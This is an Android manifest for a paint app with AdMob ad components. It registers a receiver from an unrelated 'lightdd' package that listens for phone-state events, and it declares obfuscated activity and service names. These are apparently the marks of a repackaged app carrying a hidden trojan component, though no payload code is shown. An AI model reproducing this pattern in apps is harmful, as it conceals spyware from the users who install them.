<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.electricsheep.master.paintpro">
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:label="@string/app_name" android:name="com.electricsheep.paintpro.PaintProActivity" android:screenOrientation="nosensor" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <meta-data android:name="ADMOB_PUBLISHER_ID" android:value="a14da6a743093dd"/>
        <activity android:label="@string/info_dialog" android:name="bt$gX" android:theme="@android:style/Theme.Dialog"/>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.admob.android.ads.AdMobActivity" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <receiver android:exported="true" android:name="com.admob.android.ads.analytics.InstallReceiver">
            <intent-filter>
                <action android:name="com.android.vending.INSTALL_REFERRER"/>
            </intent-filter>
        </receiver>
        <meta-data android:name="ADMOB_ALLOW_LOCATION_FOR_ADS" android:value="true"/>
        <receiver android:name="com.passionteam.lightdd.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </receiver>
        <service android:name="cf$jk"/>
    </application>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-feature android:name="android.hardware.location.network" android:required="false"/>
    <uses-feature android:name="android.hardware.location" android:required="false"/>
    <uses-feature android:name="android.hardware.touchscreen" android:required="false"/>
    <supports-screens android:anyDensity="false" android:largeScreens="true" android:normalScreens="true" android:resizeable="false" android:smallScreens="true"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
</manifest>